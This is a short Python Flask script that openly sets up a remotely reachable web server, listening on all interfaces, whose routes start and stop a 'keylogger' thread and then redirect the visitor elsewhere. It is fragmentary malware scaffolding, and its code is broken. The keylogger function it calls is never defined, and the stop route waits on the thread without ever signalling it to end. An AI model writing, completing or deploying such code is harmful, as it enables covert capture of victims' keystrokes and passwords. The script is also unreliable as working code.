from flask import Flask, request, redirect
import threading
import subprocess
import os

app = Flask(__name__)
keylogger_thread = None

@app.route('/start_keylogger', methods=['POST'])
def start_keylogger_route():
    global keylogger_thread
    if keylogger_thread is None or not keylogger_thread.is_alive():
        keylogger_thread = threading.Thread(target=start_keylogger)
        keylogger_thread.start()
    return redirect("http://example.com")  # Replace with the URL
    # return "Keylogger started", 200

@app.route('/stop_keylogger', methods=['POST'])
def stop_keylogger_route():
    global keylogger_thread
    if keylogger_thread is not None and keylogger_thread.is_alive():
        keylogger_thread.join()
        keylogger_thread = None
    return redirect("http://example.com")  # Replace with the URL
    # return "Keylogger stopped", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
